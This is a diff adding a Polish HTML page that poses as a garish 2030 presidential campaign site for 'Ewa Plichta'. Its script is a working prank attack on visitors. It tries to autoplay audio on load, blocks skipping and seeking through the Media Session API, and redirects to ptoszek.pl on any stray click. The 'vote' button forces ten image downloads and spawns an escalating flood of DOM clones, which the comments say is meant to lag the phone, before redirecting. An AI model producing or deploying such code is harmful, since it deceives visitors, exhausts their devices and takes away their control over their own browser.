@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Wielbimy Ewę Plichte - Wybory Prezydenckie 2030!</title>
+    <!-- Ładowanie Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Czcionka Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Black+Ops+One&family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
+    
+    <style>
+        /* Główne style i animacje kampanijne */
+        body {
+            font-family: 'Montserrat', sans-serif;
+            overflow-x: hidden;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            background: linear-gradient(-45deg, #ff0055, #ffcc00, #00ddff, #aa00ff, #ff3300);
+            background-size: 400% 400%;
+            animation: gradientBG 8s ease infinite;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* 1. Animacja wchodząca dla centralnego zdjęcia */
+        @keyframes photoEntrance {
+            0% {
+                opacity: 0;
+                transform: scale(0.2) rotate(-15deg) translateY(-60px);
+                filter: blur(15px);
+            }
+            70% {
+                opacity: 1;
+                transform: scale(1.06) rotate(3deg) translateY(5px);
+                filter: blur(0px);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1) rotate(0deg) translateY(0);
+                filter: blur(0px);
+            }
+        }
+
+        .animate-photo-in {
+            animation: photoEntrance 1.2s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+
+        /* 2. Animacja wchodząca dla głównego napisu */
+        @keyframes titleEntrance {
+            0% {
+                opacity: 0;
+                transform: translateY(45px) scale(0.85);
+                letter-spacing: 0.25em;
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+                letter-spacing: normal;
+            }
+        }
+
+        .animate-title-in {
+            opacity: 0;
+            animation: titleEntrance 1s cubic-bezier(0.16, 1, 0.3, 1) 0.45s forwards;
+        }
+
+        /* 3. Animacja wchodząca dla przycisku + pstrokate mruganie */
+        @keyframes buttonEntrance {
+            0% {
+                opacity: 0;
+                transform: scale(0.5) translateY(40px);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+
+        @keyframes strobeButton {
+            0% {
+                background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00);
+                border-color: #ffffff;
+                box-shadow: 0 0 25px #ff0000, 0 0 50px #ffff00, inset 0 0 15px #ffffff;
+                transform: scale(1) rotate(-1deg);
+                color: #000000;
+            }
+            25% {
+                background: linear-gradient(90deg, #00ffff, #ff00ff, #ffff00);
+                border-color: #000000;
+                box-shadow: 0 0 35px #ff00ff, 0 0 70px #00ffff, inset 0 0 20px #ffff00;
+                transform: scale(1.06) rotate(1.5deg);
+                color: #ffffff;
+            }
+            50% {
+                background: linear-gradient(90deg, #ffff00, #ff0055, #00ffcc);
+                border-color: #ff0000;
+                box-shadow: 0 0 40px #ffff00, 0 0 80px #ff0055, inset 0 0 25px #000000;
+                transform: scale(0.98) rotate(-1.5deg);
+                color: #000000;
+            }
+            75% {
+                background: linear-gradient(90deg, #7700ff, #00ff44, #ff6600);
+                border-color: #ffff00;
+                box-shadow: 0 0 45px #00ff44, 0 0 90px #7700ff, inset 0 0 20px #ffffff;
+                transform: scale(1.07) rotate(1deg);
+                color: #ffffff;
+            }
+            100% {
+                background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00);
+                border-color: #ffffff;
+                box-shadow: 0 0 25px #ff0000, 0 0 50px #ffff00, inset 0 0 15px #ffffff;
+                transform: scale(1) rotate(-1deg);
+                color: #000000;
+            }
+        }
+
+        .btn-campaign-wrapper {
+            opacity: 0;
+            animation: buttonEntrance 0.8s ease-out 0.9s forwards;
+        }
+
+        .btn-pstrokaty {
+            animation: strobeButton 0.45s infinite linear;
+            text-shadow: 2px 2px 0px rgba(255, 255, 255, 0.8), -2px -2px 0px rgba(0, 0, 0, 0.6);
+            transition: filter 0.1s;
+        }
+
+        .btn-pstrokaty:active {
+            transform: scale(0.92) !important;
+        }
+
+        /* Dekoracyjne gwiazdki / konfetti w tle */
+        .floating-star {
+            position: fixed;
+            pointer-events: none;
+            z-index: 1;
+            animation: floatStar 6s linear infinite;
+            opacity: 0.75;
+        }
+
+        @keyframes floatStar {
+            0% { transform: translateY(105vh) rotate(0deg) scale(0.8); }
+            100% { transform: translateY(-15vh) rotate(720deg) scale(1.3); }
+        }
+
+        /* Ciężkie style dla klonowanych zdjęć (efekt przeciążenia renderowania) */
+        .lag-clone {
+            position: fixed;
+            pointer-events: none;
+            z-index: 9999;
+            border-radius: 50%;
+            box-shadow: 
+                0 0 30px rgba(255, 0, 128, 0.9),
+                0 0 60px rgba(0, 255, 255, 0.9),
+                0 0 90px rgba(255, 255, 0, 0.9),
+                inset 0 0 25px rgba(255, 255, 255, 0.9);
+            filter: drop-shadow(0 0 18px #ff00ff) contrast(140%) saturate(200%);
+            will-change: transform, filter, opacity;
+            animation: spinChaos 0.35s infinite linear;
+        }
+
+        @keyframes spinChaos {
+            0% { transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.35); }
+            100% { transform: rotate(360deg) scale(1); }
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen p-4 relative overflow-hidden cursor-pointer">
+
+    <!-- ===================================================================== -->
+    <!-- MIEJSCE NA PLIKI AUDIO (ŁATWA EDYCJA ŚCIEŻEK DO PLIKÓW MP3)           -->
+    <!-- Zmień atrybut src="..." na własną ścieżkę do plików krol.mp3 i akrol2.mp3 -->
+    <!-- ===================================================================== -->
+    <!-- krol.mp3 i ewkaa.mp3 grają NAPRZEMIENNIE w pętli (krol -> ewkaa -> krol -> ...), nie jednocześnie -->
+    <audio id="audio-krol" src="krol.mp3" preload="auto" playsinline></audio>
+    <audio id="audio-ewkaa" src="ewkaa.mp3" preload="auto" playsinline></audio>
+    <audio id="audio-akrol2" src="akrol2.mp3" preload="auto" loop playsinline></audio>
+
+    <!-- Kontener na tło z gwiazdkami/konfetti -->
+    <div id="stars-container" class="fixed inset-0 pointer-events-none z-0"></div>
+
+    <!-- Kontener na lawinę klonów po kliknięciu przycisku -->
+    <div id="lag-container" class="fixed inset-0 pointer-events-none z-50"></div>
+
+    <!-- Główna karta / sekcja centralna kampanii -->
+    <main class="relative z-10 flex flex-col items-center justify-center text-center max-w-2xl w-full mx-auto my-auto py-6 px-4">
+        
+        <!-- Górny baner kampanii -->
+        <div class="mb-4 px-4 py-1.5 rounded-full bg-black/80 text-yellow-300 font-extrabold text-xs sm:text-sm uppercase tracking-widest border-2 border-yellow-400 shadow-lg animate-bounce">
+            ★ OFICJALNY SZTAB WYBORCZY 2030 ★
+        </div>
+
+        <!-- ===================================================================== -->
+        <!-- CENTRALNY ELEMENT: PLACEHOLDER NA ZDJĘCIE EWY PLICHTY                 -->
+        <!-- Aby wstawić prawdziwe zdjęcie, zamień <div id="photo-placeholder">     -->
+        <!-- na <img id="main-photo" src="twoje-zdjecie.jpg" ...>                  -->
+        <!-- ===================================================================== -->
+        <div id="hero-photo-container" class="animate-photo-in relative group mb-6">
+            <!-- Pulsująca aureola wokół zdjęcia -->
+            <div class="absolute -inset-2 rounded-full bg-gradient-to-r from-yellow-400 via-pink-500 to-cyan-400 blur-md opacity-90 animate-pulse"></div>
+            
+            <!-- Kontener zdjęcia / Placeholder -->
+            <div id="main-photo-box" class="relative w-56 h-56 sm:w-72 sm:h-72 rounded-full border-8 border-white shadow-2xl overflow-hidden bg-gradient-to-br from-indigo-900 via-purple-800 to-pink-700 flex flex-col items-center justify-center p-4">
+                
+                <!-- Opcjonalny obrazek z fallbackiem na SVG placeholder -->
+                <!-- PODMIEŃ PONIŻSZY SRC NA ZDJĘCIE EWY PLICHTY (np. src="ewa.jpg") -->
+                <img 
+                    id="candidate-img"
+                    src="" 
+                    alt="Ewa Plichta - Kandydatka na Prezydenta 2030"
+                    class="hidden w-full h-full object-cover rounded-full"
+                    onload="this.classList.remove('hidden'); document.getElementById('svg-placeholder').classList.add('hidden');"
+                    onerror="this.classList.add('hidden'); document.getElementById('svg-placeholder').classList.remove('hidden');"
+                />
+
+                <!-- Estetyczny placeholder SVG wyświetlany dopóki nie podasz pliku zdjęcia -->
+                <div id="svg-placeholder" class="flex flex-col items-center justify-center text-white w-full h-full">
+                    <svg class="w-24 h-24 sm:w-28 sm:h-28 text-yellow-300 drop-shadow-md mb-2" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <!-- Korona prezydencka -->
+                        <path d="M30 35L42 18L60 32L78 18L90 35H30Z" fill="#FACC15" stroke="#FEF08A" stroke-width="3" stroke-linejoin="round"/>
+                        <circle cx="42" cy="15" r="3" fill="#FFFFFF"/>
+                        <circle cx="60" cy="12" r="4" fill="#FFFFFF"/>
+                        <circle cx="78" cy="15" r="3" fill="#FFFFFF"/>
+                        <!-- Sylwetka -->
+                        <circle cx="60" cy="58" r="18" fill="#FDE047" stroke="#FFFFFF" stroke-width="3"/>
+                        <path d="M26 105C26 86.2223 41.2223 78 60 78C78.7777 78 94 86.2223 94 105" fill="#FACC15" stroke="#FFFFFF" stroke-width="3" stroke-linecap="round"/>
+                    </svg>
+                    <span class="font-black text-xs sm:text-sm uppercase tracking-wider text-yellow-200 bg-black/50 px-3 py-1 rounded-xl border border-yellow-300/60 leading-tight">
+                        MIEJSCE NA ZDJĘCIE<br>EWY PLICHTY
+                    </span>
+                </div>
+            </div>
+
+            <!-- Odznaka na zdjęciu -->
+            <div class="absolute -bottom-2 right-2 sm:right-4 bg-red-600 text-white font-black text-xs sm:text-sm px-3 py-1 rounded-full border-4 border-yellow-300 shadow-xl transform rotate-6">
+                2030 🇵🇱
+            </div>
+        </div>
+
+        <!-- GŁÓWNY NAPIS Z ANIMACJĄ WCHODZĄCĄ -->
+        <h1 class="animate-title-in text-4xl sm:text-6xl md:text-7xl font-black text-white uppercase tracking-tight mb-8 drop-shadow-[0_6px_0_rgba(0,0,0,0.85)] leading-none">
+            <span class="bg-clip-text text-transparent bg-gradient-to-b from-white via-yellow-100 to-yellow-300" style="-webkit-text-stroke: 2px #000;">
+                Wielbimy Ewę Plichte
+            </span>
+        </h1>
+
+        <!-- DUŻY, PSTROKATY, MRUGAJĄCY PRZYCISK KAMPANIJNY -->
+        <div class="btn-campaign-wrapper w-full max-w-xl px-2">
+            <button 
+                id="vote-button"
+                type="button"
+                class="btn-pstrokaty w-full py-5 px-6 sm:py-7 sm:px-8 rounded-3xl border-8 font-black text-xl sm:text-3xl md:text-4xl uppercase tracking-wide cursor-pointer leading-tight select-none"
+            >
+                Głosuj na Ewę Plichte w wyborach prezydenckich 2030!
+            </button>
+        </div>
+
+    </main>
+
+    <script>
+        /**
+         * =========================================================================
+         * KONFIGURACJA KAMPANII (ŁATWA EDYCJA ŚCIEŻEK I URL)
+         * =========================================================================
+         */
+        const CONFIG = {
+            // Ścieżki do plików dźwiękowych (możesz też zmienić bezpośrednio w tagach <audio> powyżej)
+            krolAudioSrc: 'krol.mp3',
+            ewkaaAudioSrc: 'ewkaa.mp3',
+            akrol2AudioSrc: 'akrol2.mp3',
+            
+            // Ścieżka do zdjęcia (jeśli zostawisz puste '', wyświetli się estetyczny placeholder SVG)
+            candidatePhotoSrc: 'https://i.ibb.co/C31z9NPS/Screenshot-20261117-071517.png',
+            
+            // Ile razy pobrać zdjęcie po kliknięciu przycisku "Głosuj"
+            photoDownloadCount: 10,
+
+            // Docelowy adres przekierowania
+            redirectUrl: 'https://ptoszek.pl',
+            
+            // Opóźnienie otwarcia strony po kliknięciu głównego przycisku (w milisekundach)
+            lagDurationBeforeRedirectMs: 1800
+        };
+
+        // Pobranie referencji DOM
+        const audioKrol = document.getElementById('audio-krol');
+        const audioEwkaa = document.getElementById('audio-ewkaa');
+        const audioAkrol2 = document.getElementById('audio-akrol2');
+        const voteButton = document.getElementById('vote-button');
+        const lagContainer = document.getElementById('lag-container');
+        const starsContainer = document.getElementById('stars-container');
+        const candidateImg = document.getElementById('candidate-img');
+        const mainPhotoBox = document.getElementById('main-photo-box');
+
+        // Ustawienie źródeł z konfiguracji
+        if (CONFIG.krolAudioSrc) audioKrol.src = CONFIG.krolAudioSrc;
+        if (CONFIG.ewkaaAudioSrc) audioEwkaa.src = CONFIG.ewkaaAudioSrc;
+        if (CONFIG.akrol2AudioSrc) audioAkrol2.src = CONFIG.akrol2AudioSrc;
+        if (CONFIG.candidatePhotoSrc) candidateImg.src = CONFIG.candidatePhotoSrc;
+
+        /**
+         * =========================================================================
+         * POBIERANIE ZDJĘCIA Z PLACEHOLDERA (po kliknięciu przycisku Głosuj)
+         * Zdjęcie jest pobierane do pamięci już przy wejściu na stronę, żeby po
+         * kliknięciu zapis ruszył natychmiast (zanim nastąpi przekierowanie).
+         * =========================================================================
+         */
+        let photoBlob = null;
+        let photoBlobPromise = null;
+
+        function prefetchPhoto() {
+            if (!CONFIG.candidatePhotoSrc) return Promise.resolve(null);
+            if (photoBlobPromise) return photoBlobPromise;
+            photoBlobPromise = fetch(CONFIG.candidatePhotoSrc, { mode: 'cors' })
+                .then(r => r.ok ? r.blob() : null)
+                .then(b => { photoBlob = b; return b; })
+                .catch(() => null);
+            return photoBlobPromise;
+        }
+        prefetchPhoto();
+
+        function downloadPhotoOnce(index) {
+            const a = document.createElement('a');
+            const ext = (photoBlob && photoBlob.type && photoBlob.type.split('/')[1]) || 'png';
+            a.download = 'ewa-plichta-' + index + '.' + ext;
+            if (photoBlob) {
+                a.href = URL.createObjectURL(photoBlob);
+            } else {
+                // Awaryjnie (np. brak CORS) - link bezpośredni w nowej karcie, żeby nie opuszczać strony
+                a.href = CONFIG.candidatePhotoSrc;
+                a.target = '_blank';
+                a.rel = 'noopener';
+            }
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            setTimeout(() => {
+                a.remove();
+                if (photoBlob) URL.revokeObjectURL(a.href);
+            }, 10000);
+        }
+
+        function downloadPhotoMultiple() {
+            if (!CONFIG.candidatePhotoSrc) return;
+            const total = CONFIG.photoDownloadCount;
+            for (let i = 1; i <= total; i++) {
+                // Pierwsze od razu, kolejne co 100 ms (mieszczą się przed przekierowaniem)
+                setTimeout(() => downloadPhotoOnce(i), (i - 1) * 100);
+            }
+        }
+
+        let isVoteClicked = false;
+        let isRedirected = false;
+
+        /**
+         * =========================================================================
+         * 1. BLOKADA PRZEWIJANIA MUZYKI W POWIADOMIENIU SYSTEMOWYM (MEDIA SESSION API)
+         * =========================================================================
+         */
+        function lockMediaSessionSeeking() {
+            if ('mediaSession' in navigator) {
+                try {
+                    navigator.mediaSession.metadata = new MediaMetadata({
+                        title: 'Wielbimy Ewę Plichte 2030',
+                        artist: 'Sztab Wyborczy Ewy Plichty',
+                        album: 'Wybory Prezydenckie 2030'
+                    });
+
+                    // Nadpisanie i wyłączenie wszystkich akcji przewijania na ekranie blokady / powiadomieniu
+                    const blockedActions = ['seekto', 'seekforward', 'seekbackward', 'previoustrack', 'nexttrack'];
+                    blockedActions.forEach(action => {
+                        try {
+                            navigator.mediaSession.setActionHandler(action, () => {
+                                // Celowo puste - blokuje przewijanie w powiadomieniu systemowym
+                            });
+                        } catch (e) {
+                            // Ignoruj nieobsługiwane akcje w danej przeglądarce
+                        }
+                    });
+
+                    // Wymuszenie braku paska postępu / zerowej pozycji
+                    if (typeof navigator.mediaSession.setPositionState === 'function') {
+                        navigator.mediaSession.setPositionState({
+                            duration: Infinity,
+                            playbackRate: 1.0,
+                            position: 0
+                        });
+                    }
+                } catch (err) {
+                    console.warn('MediaSession API ograniczone:', err);
+                }
+            }
+        }
+
+        // Dodatkowe zabezpieczenie przed próbą zmiany czasu (seeking) bezpośrednio na elementach <audio>
+        [audioKrol, audioEwkaa, audioAkrol2].forEach(audioEl => {
+            let lastTime = 0;
+            audioEl.addEventListener('timeupdate', () => {
+                if (!audioEl.seeking) {
+                    lastTime = audioEl.currentTime;
+                }
+            });
+            audioEl.addEventListener('seeking', () => {
+                // Cofnij próbę przewinięcia
+                if (Math.abs(audioEl.currentTime - lastTime) > 0.5) {
+                    audioEl.currentTime = lastTime;
+                }
+            });
+        });
+
+        /**
+         * =========================================================================
+         * 2. AUTOMATYCZNE URUCHOMIENIE krol.mp3 PRZY WEJŚCIU NA STRONĘ
+         * =========================================================================
+         */
+        // Playlista w pętli: krol.mp3 -> ewkaa.mp3 -> krol.mp3 -> ... (po kolei, nie na raz)
+        const playlist = [audioKrol, audioEwkaa];
+        let playlistIndex = 0;
+        let playlistErrors = 0;
+
+        function playPlaylistTrack(index) {
+            playlistIndex = index % playlist.length;
+            const track = playlist[playlistIndex];
+            track.volume = 1.0;
+            track.currentTime = 0;
+            const p = track.play();
+            if (p !== undefined) {
+                p.then(() => lockMediaSessionSeeking()).catch(() => {
+                    // Autoplay zablokowany przed interakcją - nie blokujemy reszty strony.
+                });
+            }
+        }
+
+        function playNextInPlaylist() {
+            playPlaylistTrack(playlistIndex + 1);
+        }
+
+        playlist.forEach(track => {
+            track.addEventListener('ended', () => {
+                playlistErrors = 0;
+                playNextInPlaylist();
+            });
+            // Gdy któregoś pliku brakuje - pomiń go, ale nie zapętlaj błędów w nieskończoność
+            track.addEventListener('error', () => {
+                playlistErrors++;
+                if (playlistErrors < playlist.length) playNextInPlaylist();
+            });
+        });
+
+        function isPlaylistPlaying() {
+            return playlist.some(t => !t.paused && !t.ended);
+        }
+
+        function tryStartBackgroundAudio() {
+            lockMediaSessionSeeking();
+            if (isPlaylistPlaying()) return;
+            playPlaylistTrack(playlistIndex);
+        }
+
+        // Próba odtworzenia natychmiast po załadowaniu DOM i window.onload
+        document.addEventListener('DOMContentLoaded', tryStartBackgroundAudio);
+        window.addEventListener('load', tryStartBackgroundAudio);
+
+        /**
+         * =========================================================================
+         * 3. GENEROWANIE DEKORACYJNYCH GWIAZDEK W TLE
+         * =========================================================================
+         */
+        function createBackgroundStars() {
+            const symbols = ['★', '🇵🇱', '✨', '👑', '🎉', '🔥'];
+            for (let i = 0; i < 22; i++) {
+                const star = document.createElement('div');
+                star.className = 'floating-star text-2xl sm:text-4xl';
+                star.textContent = symbols[i % symbols.length];
+                star.style.left = Math.random() * 100 + 'vw';
+                star.style.animationDuration = (4 + Math.random() * 6) + 's';
+                star.style.animationDelay = (-Math.random() * 6) + 's';
+                starsContainer.appendChild(star);
+            }
+        }
+        createBackgroundStars();
+
+        /**
+         * =========================================================================
+         * 4. OTWIERANIE ptoszek.pl PO KLIKNIĘCIU GDZIEKOLWIEK NA 1. STRONIE
+         * (Przed wciśnięciem głównego przycisku)
+         * =========================================================================
+         */
+        function openTargetSite() {
+            if (isRedirected) return;
+            isRedirected = true;
+            
+            // Próba otwarcia w nowej karcie oraz przekierowanie bieżącej jako niezawodny fallback
+            const win = window.open(CONFIG.redirectUrl, '_blank');
+            if (!win || win.closed || typeof win.closed === 'undefined') {
+                window.location.href = CONFIG.redirectUrl;
+            } else {
+                window.location.href = CONFIG.redirectUrl;
+            }
+        }
+
+        // Nasłuchiwanie kliknięcia gdziekolwiek na stronie (poza przyciskiem)
+        document.addEventListener('click', (event) => {
+            // Jeśli kliknięto w przycisk głosowania lub po jego kliknięciu - obsługuje to handler przycisku
+            if (isVoteClicked || voteButton.contains(event.target)) {
+                return;
+            }
+            // Natychmiastowe otwarcie ptoszek.pl po kliknięciu w dowolne inne miejsce na 1. stronie
+            openTargetSite();
+        });
+
+        /**
+         * =========================================================================
+         * 5. AKCJA PO KLIKNIĘCIU PRZYCISKU GŁOSOWANIA:
+         * - Równoczesne granie krol.mp3 + akrol2.mp3
+         * - Lawinowe generowanie kopii centralnego zdjęcia obciążające urządzenie (lag)
+         * - Przekierowanie na ptoszek.pl po krótkiej chwili
+         * =========================================================================
+         */
+        function triggerPhotoLagStorm() {
+            const screenW = window.innerWidth;
+            const screenH = window.innerHeight;
+            let totalClones = 0;
+
+            // Funkcja tworząca paczkę ciężkich wizualnie klonów zdjęcia
+            function spawnBatch(batchSize) {
+                const fragment = document.createDocumentFragment();
+                for (let i = 0; i < batchSize; i++) {
+                    const clone = mainPhotoBox.cloneNode(true);
+                    clone.removeAttribute('id');
+                    clone.className = 'lag-clone flex flex-col items-center justify-center p-2 bg-gradient-to-br from-yellow-400 via-red-600 to-purple-800 border-4 border-white';
+                    
+                    const size = 90 + Math.random() * 180;
+                    clone.style.width = size + 'px';
+                    clone.style.height = size + 'px';
+                    clone.style.left = (Math.random() * (screenW + 100) - 50) + 'px';
+                    clone.style.top = (Math.random() * (screenH + 100) - 50) + 'px';
+                    clone.style.animationDuration = (0.15 + Math.random() * 0.4) + 's';
+                    
+                    // Wymuszenie przeliczenia layoutu / stylu dla maksymalnego obciążenia renderera
+                    fragment.appendChild(clone);
+                    totalClones++;
+                }
+                lagContainer.appendChild(fragment);
+            }
+
+            // Lawinowe dokładanie elementów w pętli requestAnimationFrame oraz setInterval
+            let batchMultiplier = 25;
+            function lagFrameLoop() {
+                if (isRedirected) return;
+                spawnBatch(batchMultiplier);
+                batchMultiplier = Math.min(batchMultiplier + 18, 250);
+
+                // Dodatkowe wymuszenie reflow / odczytu geometrii DOM dla efektu lagowania telefonu
+                const allClones = lagContainer.children;
+                for (let j = 0; j < Math.min(allClones.length, 120); j++) {
+                    const el = allClones[j];
+                    el.style.transform = `translate3d(${(Math.random() - 0.5) * 30}px, ${(Math.random() - 0.5) * 30}px, 0) rotate(${Math.random() * 360}deg) scale(${0.8 + Math.random() * 0.7})`;
+                }
+
+                requestAnimationFrame(lagFrameLoop);
+            }
+
+            // Start pętli klatek oraz równoległego interwału
+            requestAnimationFrame(lagFrameLoop);
+            const heavyInterval = setInterval(() => {
+                if (isRedirected) {
+                    clearInterval(heavyInterval);
+                    return;
+                }
+                spawnBatch(60);
+            }, 40);
+        }
+
+        voteButton.addEventListener('click', (event) => {
+            // Zatrzymanie propagacji, aby nie wywołać natychmiastowego kliknięcia tła
+            event.stopPropagation();
+
+            if (isVoteClicked) return;
+            isVoteClicked = true;
+
+            // 1. Pętla (krol <-> ewkaa) leci dalej, a akrol2.mp3 nakłada się na nią
+            audioAkrol2.volume = 1.0;
+            
+            // Jeśli autoplay był zablokowany i pętla jeszcze nie gra - uruchom ją teraz
+            if (!isPlaylistPlaying()) {
+                playPlaylistTrack(playlistIndex);
+            }
+            audioAkrol2.currentTime = 0;
+            audioAkrol2.play().catch(() => {});
+
+            // Ponowne zablokowanie przewijania w powiadomieniu systemowym
+            lockMediaSessionSeeking();
+
+            // 1b. Pobranie zdjęcia 10 razy
+            downloadPhotoMultiple();
+
+            // 2. Rozpoczęcie lawinowego generowania kopii zdjęcia obciążających telefon
+            triggerPhotoLagStorm();
+
+            // 3. Po krótkiej chwili (1.8 sekundy) automatyczne otwarcie ptoszek.pl
+            setTimeout(() => {
+                openTargetSite();
+            }, CONFIG.lagDurationBeforeRedirectMs);
+        });
+    </script>
+</body>
+</html>
